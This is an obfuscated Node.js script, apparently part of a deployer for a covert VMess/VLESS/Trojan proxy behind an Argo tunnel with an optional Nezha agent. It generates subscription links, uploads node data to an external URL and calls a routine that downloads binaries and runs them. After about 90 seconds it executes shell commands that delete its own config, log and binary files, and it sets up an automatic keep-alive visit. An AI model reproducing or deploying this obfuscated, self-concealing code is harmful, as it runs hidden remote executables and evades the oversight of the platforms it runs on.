_0x120026=_0x2ce4,_0x3766eb={'v':'2','ps':''+_0x5b24c1,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x2a0fb5,'path':'/vmess-argo?ed=2560','tls':_0x120026(0x19b),'sni':_0x2a0fb5,'alpn':'','fp':'firefox'},_0x49d782=_0x120026(0x154)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x2a0fb5+_0x120026(_0x484c6a._0x44bf82)+_0x2a0fb5+_0x120026(_0x484c6a._0x378517)+_0x5b24c1+_0x120026(_0x484c6a._0x5a9656)+Buffer[_0x120026(0x183)](JSON['stringify'](_0x3766eb))['toString'](_0x120026(0x1bf))+_0x120026(0x1a7)+UUID+'@'+CFIP+':'+CFPORT+_0x120026(_0x484c6a._0x5da6bb)+_0x2a0fb5+_0x120026(0x178)+_0x2a0fb5+_0x120026(_0x484c6a._0x58fa82)+_0x5b24c1+_0x120026(_0x484c6a._0x504438);console[_0x120026(0x197)](Buffer[_0x120026(_0x484c6a._0x5cae50)](_0x49d782)[_0x120026(0x196)](_0x120026(0x1bf))),fs['writeFileSync'](subPath,Buffer[_0x120026(_0x484c6a._0x5cae50)](_0x49d782)['toString'](_0x120026(_0x484c6a._0x4d469f))),console['log'](FILE_PATH+_0x120026(0x165)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x275e8b,_0x1420ee)=>{const _0xeb8678=_0x120026,_0x15ed86=Buffer['from'](_0x49d782)[_0xeb8678(0x196)]('base64');_0x1420ee[_0xeb8678(_0x217540._0xa842e3)](_0xeb8678(_0x217540._0x2ce9f0),_0xeb8678(0x1db)),_0x1420ee['send'](_0x15ed86);}),_0x3f3d71(_0x49d782);},0x7d0);});}}async function uploadNodes(){const _0x4ff6ef={_0x507eae:0x1d2,_0x2eb410:0x187,_0x11da5e:0x17a,_0x4b135d:0x151,_0x10b183:0x1a6,_0x1b2ad7:0x12b,_0x509d43:0x1e2},_0x8232be=_0x2f5a20;if(UPLOAD_URL&&PROJECT_URL){const _0x4b6ae5=PROJECT_URL+'/'+SUB_PATH,_0x10ab60={'subscription':[_0x4b6ae5]};try{const _0x3f62fb=await axios[_0x8232be(0x1a6)](UPLOAD_URL+_0x8232be(_0x4ff6ef._0x507eae),_0x10ab60,{'headers':{'Content-Type':_0x8232be(0x12b)}});return _0x3f62fb&&_0x3f62fb[_0x8232be(_0x4ff6ef._0x2eb410)]===0xc8?(console[_0x8232be(0x197)](_0x8232be(0x15e)),_0x3f62fb):null;}catch(_0x41768b){if(_0x41768b[_0x8232be(0x14f)]){if(_0x41768b[_0x8232be(0x14f)][_0x8232be(_0x4ff6ef._0x2eb410)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x8232be(_0x4ff6ef._0x11da5e)](listPath))return;const _0x51f67e=fs[_0x8232be(0x1a1)](listPath,_0x8232be(0x135)),_0x22fff7=_0x51f67e[_0x8232be(_0x4ff6ef._0x4b135d)]('\x0a')['filter'](_0x135aba=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x8232be(0x161)](_0x135aba));if(_0x22fff7['length']===0x0)return;const _0x303e7c=JSON['stringify']({'nodes':_0x22fff7});try{const _0x23b648=await axios[_0x8232be(_0x4ff6ef._0x10b183)](UPLOAD_URL+'/api/add-nodes',_0x303e7c,{'headers':{'Content-Type':_0x8232be(_0x4ff6ef._0x1b2ad7)}});return _0x23b648&&_0x23b648[_0x8232be(_0x4ff6ef._0x2eb410)]===0xc8?(console['log'](_0x8232be(_0x4ff6ef._0x509d43)),_0x23b648):null;}catch(_0x206875){return null;}}else return;}}function cleanFiles(){const _0xd82ee1={_0x5714c4:0x166,_0x5aad86:0x177,_0x46bccd:0x1b6,_0x2c2dc7:0x146,_0x190f8d:0x1c6,_0x331b9c:0x18d},_0x3e753a={_0x1c527d:0x197,_0x299357:0x1a5};setTimeout(()=>{const _0x4f92a2={_0x1bfcf5:0x197},_0x202484=_0x2ce4,_0x471c5e=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x471c5e[_0x202484(_0xd82ee1._0x5714c4)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x471c5e[_0x202484(0x166)](phpPath);process[_0x202484(0x137)]===_0x202484(_0xd82ee1._0x5aad86)?exec(_0x202484(_0xd82ee1._0x46bccd)+_0x471c5e['join']('\x20')+_0x202484(_0xd82ee1._0x2c2dc7),_0x440fce=>{const _0x231f06=_0x202484;console[_0x231f06(0x13a)](),console[_0x231f06(_0x3e753a._0x1c527d)](_0x231f06(_0x3e753a._0x299357)),console[_0x231f06(_0x3e753a._0x1c527d)](_0x231f06(0x1d4));}):exec(_0x202484(_0xd82ee1._0x190f8d)+_0x471c5e['join']('\x20')+_0x202484(_0xd82ee1._0x331b9c),_0x2482ba=>{const _0x148ba2=_0x202484;console[_0x148ba2(0x13a)](),console[_0x148ba2(0x197)](_0x148ba2(0x1a5)),console[_0x148ba2(_0x4f92a2._0x1bfcf5)](_0x148ba2(0x1d4));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x287c8f={_0x38c188:0x1d5,_0x1efde7:0x12b},_0x2a0ee7=_0x2f5a20;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x2a0ee7(0x174));return;}try{const _0xf187c=await axios[_0x2a0ee7(0x1a6)](_0x2a0ee7(_0x287c8f._0x38c188),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2a0ee7(_0x287c8f._0x1efde7)}});return console[_0x2a0ee7(0x197)](_0x2a0ee7(0x189)),_0xf187c;}catch(_0x4a9dac){return console[_0x2a0ee7(0x17d)](_0x2a0ee7(0x1e1)+_0x4a9dac['message']),null;}}async function startserver(){try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x215889){console['error']('Error\x20in\x20startserver:',_0x215889);}}startserver()[_0x2f5a20(0x152)](_0x531940=>{const _0x398a4b={_0x5b7f36:0x17d,_0x61d3bf:0x13f},_0xfbc357=_0x2f5a20;console[_0xfbc357(_0x398a4b._0x5b7f36)](_0xfbc357(_0x398a4b._0x61d3bf),_0x531940);}),app[_0x2f5a20(0x159)](PORT,()=>console[_0x2f5a20(0x197)](_0x2f5a20(0x1cb)+PORT+'!'));
